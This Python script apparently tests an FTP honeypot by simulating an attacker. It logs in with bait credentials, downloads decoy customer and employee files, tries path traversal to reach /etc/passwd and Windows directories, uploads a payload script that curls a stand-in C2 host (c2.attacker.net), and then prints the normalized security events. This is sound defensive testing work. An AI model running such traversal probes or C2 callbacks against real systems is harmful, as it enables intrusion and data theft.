"""Simulated Attacker Interaction Script for FTP Honeypot.

Simulates an adversary interacting with the fake FTP server:
1. Attempting unauthorized brute-force login (failure).
2. Authenticating with bait credentials discovered on SSH node (backup_user).
3. Enumerating directory listings across corporate backup paths.
4. Exfiltrating decoy sensitive data (customer_database.sql, employee_records.csv).
5. Attempting directory traversal out of virtual sandbox.
6. Uploading simulated malicious persistence payload via STOR.
7. Verifying structured security events generated and normalized.
"""

from __future__ import annotations

import ftplib
import io
import json
import sys
import time
from pathlib import Path

# Add project root to path
PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from collector.normalizer import EventNormalizer
from shared.config import settings
from shared.logger import get_logger

logger = get_logger("FTPAttackSimulator")


def test_failed_authentication(host: str, port: int, user: str = "unauthorized_intruder", pwd: str = "WrongPassword123!") -> bool:
    """Simulate unauthorized authentication attempt."""
    logger.info("Simulating failed FTP login: %s / %s...", user, "*" * len(pwd))
    ftp = ftplib.FTP()
    try:
        ftp.connect(host, port, timeout=5)
        ftp.login(user, pwd)
        logger.warning("Unexpected: Failed authentication was accepted.")
        ftp.quit()
        return False
    except ftplib.error_perm as perm_err:
        logger.info("Expected: Authentication rejected (%s)", perm_err)
        return True
    except Exception as exc:
        logger.error("Connection error during failed auth test: %s", exc)
        return False


def test_successful_interaction(host: str, port: int, user: str = "backup_user", pwd: str = "Backup@2026") -> list[str]:
    """Simulate full adversary reconnaissance and exfiltration flow."""
    logger.info("Simulating authentication with bait credentials: %s...", user)
    ftp = ftplib.FTP()
    captured_logs = []

    try:
        ftp.connect(host, port, timeout=5)
        welcome = ftp.getwelcome()
        logger.info("FTP Banner: %s", welcome)
        captured_logs.append(f"BANNER: {welcome}")

        # Login
        ftp.login(user, pwd)
        logger.info("Authenticated successfully as %s!", user)

        # 1. PWD
        curr_dir = ftp.pwd()
        logger.info("Initial Directory: %s", curr_dir)
        captured_logs.append(f"PWD: {curr_dir}")

        # 2. Directory Listing in /backups/finance
        listing = []
        ftp.retrlines("LIST", listing.append)
        logger.info("Directory contents of %s (%d files):", curr_dir, len(listing))
        for line in listing:
            logger.info("  %s", line)
            captured_logs.append(f"LIST: {line}")

        # 3. Exfiltrate customer_database.sql
        logger.info("Adversary exfiltrating customer_database.sql...")
        sql_buffer = io.BytesIO()
        ftp.retrbinary("RETR customer_database.sql", sql_buffer.write)
        sql_content = sql_buffer.getvalue().decode("utf-8", errors="replace")
        logger.info("Exfiltrated SQL file: %d bytes (starts with: %s)", len(sql_content), sql_content[:60].replace("\n", " "))
        captured_logs.append(f"DOWNLOAD: customer_database.sql ({len(sql_content)} bytes)")

        # 4. Navigate to /corporate
        ftp.cwd("/corporate")
        corp_listing = []
        ftp.retrlines("LIST", corp_listing.append)
        logger.info("Navigated to /corporate. Files:")
        for line in corp_listing:
            logger.info("  %s", line)
            captured_logs.append(f"LIST /corporate: {line}")

        # 5. Exfiltrate employee_records.csv
        logger.info("Adversary exfiltrating employee_records.csv...")
        csv_buffer = io.BytesIO()
        ftp.retrbinary("RETR employee_records.csv", csv_buffer.write)
        csv_content = csv_buffer.getvalue().decode("utf-8", errors="replace")
        logger.info("Exfiltrated CSV: %d bytes, sample row: %s", len(csv_content), csv_content.splitlines()[1] if len(csv_content.splitlines()) > 1 else "")
        captured_logs.append(f"DOWNLOAD: employee_records.csv ({len(csv_content)} bytes)")

        # 6. Attempt Path Traversal
        logger.info("Attempting directory traversal escape (../../../../Windows)...")
        try:
            ftp.cwd("../../../../../Windows")
            logger.warning("CWD path traversal returned success!")
        except ftplib.error_perm as perm_err:
            logger.info("Expected: Directory traversal blocked (%s)", perm_err)

        try:
            trap_buf = io.BytesIO()
            ftp.retrbinary("RETR ../../../etc/passwd", trap_buf.write)
        except ftplib.error_perm as perm_err:
            logger.info("Expected: Arbitrary host file read blocked (%s)", perm_err)

        # 7. Upload simulated adversary persistence script
        logger.info("Uploading simulated payload (stage2_payload.sh)...")
        payload = b"#!/bin/bash\n# Adversary probe script\ncurl http://c2.attacker.net/ping\n"
        ftp.storbinary("STOR stage2_payload.sh", io.BytesIO(payload))
        logger.info("Payload uploaded successfully!")
        captured_logs.append("UPLOAD: stage2_payload.sh (49 bytes)")

        ftp.quit()
        logger.info("Adversary FTP session closed.")
    except Exception as exc:
        logger.error("Error during authenticated FTP interaction: %s", exc)
        raise

    return captured_logs


def parse_and_display_events(json_log_path: Path) -> int:
    """Read FTP JSON logs, normalize them into SecurityEvent objects, and display them."""
    if not json_log_path.exists():
        logger.error("Log file not found: %s", json_log_path)
        return 0

    logger.info("Parsing captured raw events from: %s", json_log_path)
    normalized_events = []

    with open(json_log_path, "r", encoding="utf-8") as f:
        for line in f:
            if not line.strip():
                continue
            event = EventNormalizer.normalize(json.loads(line.strip()), protocol="FTP")
            if event:
                normalized_events.append(event)

    print("\n" + "=" * 80)
    print(f" NORMALIZED FTP SECURITY EVENTS CAPTURED ({len(normalized_events)} total)")
    print("=" * 80)
    for idx, ev in enumerate(normalized_events, 1):
        print(f"\n[FTP Event #{idx}] ID: {ev.event_id}")
        print(f"  Asset ID   : {ev.asset_id}")
        print(f"  Protocol   : {ev.protocol}")
        print(f"  Event Type : {ev.event_type}")
        print(f"  Source     : {ev.source_ip}:{ev.source_port or 'N/A'}")
        print(f"  Username   : {ev.username or 'N/A'}")
        print(f"  Status     : {ev.status}")
        print(f"  Timestamp  : {ev.timestamp}")
        print(f"  Metadata   : {json.dumps(ev.metadata, indent=4)}")

    print("\n" + "=" * 80 + "\n")
    return len(normalized_events)


def main():
    host = "127.0.0.1" if settings.FTP_LISTEN_HOST in ("0.0.0.0", "") else settings.FTP_LISTEN_HOST
    port = settings.FTP_LISTEN_PORT

    logger.info("Starting FTP Honeypot Attack Simulation targeting %s:%d...", host, port)

    # 1. Failed auth attempt
    test_failed_authentication(host, port, user="unauthorized_attacker", pwd="WrongPassword123!")
    time.sleep(1)

    # 2. Authenticated flow
    logs = test_successful_interaction(host, port, user="backup_user", pwd="Backup@2026")

    time.sleep(1)

    # 3. Parse and display normalized events
    log_file = settings.FTP_JSON_LOG
    parse_and_display_events(log_file)


if __name__ == "__main__":
    main()
